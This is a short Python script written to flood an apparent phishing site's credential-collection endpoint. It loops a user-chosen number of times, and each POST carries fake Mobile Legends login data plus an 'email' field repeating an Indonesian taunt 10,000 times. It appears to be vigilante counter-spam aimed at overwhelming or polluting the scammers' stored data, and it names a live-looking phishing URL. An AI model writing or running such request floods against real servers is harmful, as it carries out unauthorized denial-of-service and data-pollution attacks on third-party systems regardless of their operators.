import requests

url = 'https://uebnks8.rizzydf.biz.id/data.php' #BTG6ZO
headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
}

loop_value = int(input("bar bar brp kali? : "))

for i in range(1, loop_value+1):
    email = str(i) +'''
    | MARKOCOP KW ⚠️ kena sspam wkwkw ⚠️|⚠️ bang udah bang ⚠️ | CIE DATANYA DIHAPUS wkwkwk link baru
    |BY : -FRNDS 🖕🖕🖕'''*10000

    data = {
        'playid'    : '666666666',
        'nickname'  : 'Pernah',
        'level'     : '100',
        'tier'      : 'Mythic Glory',
        'email'     : email,
        'password'  : 'Masih zaman tipu2 dek-dek, mo beli Rubicon kah?🗿',
        'login'     : 'Moonton'
    }
    
    response = requests.post(url, data=data, headers=headers)
    print("bang udah bang", i)
